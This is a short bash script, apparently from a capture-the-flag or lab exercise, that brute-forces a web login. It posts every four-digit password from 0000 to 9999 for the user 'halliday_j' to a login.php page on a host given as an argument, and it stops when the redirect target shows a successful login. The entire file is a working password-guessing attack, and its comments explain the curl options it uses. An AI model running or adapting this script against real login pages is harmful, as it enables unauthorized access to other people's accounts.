#!/bin/bash

##################################################
# Simple bruteforce to server arg1 user halliday_j
# O : Print password
##################################################

varLink="http://$1/login.php"

for i in $(seq -f "%04g" 0 9999)
do
    # Request to a server with prot
    # L Follow redirect if request has move
    # s silent
    # w display info on stdout after a completed transfer (%) normal output (var)
    # url_effective url that was fetched last
    # d send data in method POST
    
    http_code=$(curl -Ls -w '%{url_effective}'  --data "login=halliday_j&password="$i"" $varLink)
    url=$(echo "$http_code" |  tail -1)
    
    if [ "$url" = "$varLink" ]
    then
	echo $i " - Failed"
	
    else
	echo "FOUND PASSWORD" $i
	break
    fi
    
done
